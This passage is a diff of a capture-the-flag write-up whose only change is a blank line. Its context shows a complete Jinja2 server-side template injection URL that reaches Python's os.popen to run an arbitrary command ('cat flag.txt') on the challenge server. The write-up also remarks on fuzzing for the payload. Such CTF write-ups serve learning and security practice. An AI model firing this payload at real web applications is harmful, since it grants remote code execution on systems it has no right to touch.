@@ -21,6 +21,7 @@ So after some fuzzing using payload from https://github.com/swisskyrepo/Payloads
 http://jh2i.com:50023/admin/%7B%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%%7D%7B%%20if%20%22warning%22%20in%20x.__name__%20%%7D%7B%7Bx()._module.__builtins__['__import__']('os').popen(request.args.input).read()%7D%7D%7B%endif%%7D%7B%endfor%%7D?input=cat%20flag.txt
 ```
 And the flag got reflected:
+
 ![flag](https://scontent.fhan2-5.fna.fbcdn.net/v/t1.15752-0/p280x280/116264299_1407700809430461_432005348538169082_n.png?_nc_cat=109&_nc_sid=b96e70&_nc_ohc=Bsla3_11jHMAX8KusZy&_nc_ht=scontent.fhan2-5.fna&oh=d0bce4232e15e0d381ce5a75a5bdce64&oe=5F4DCD0C)
 
 Simple challenge, but i dislike the bruteforcing part. It's kind of hit or miss.
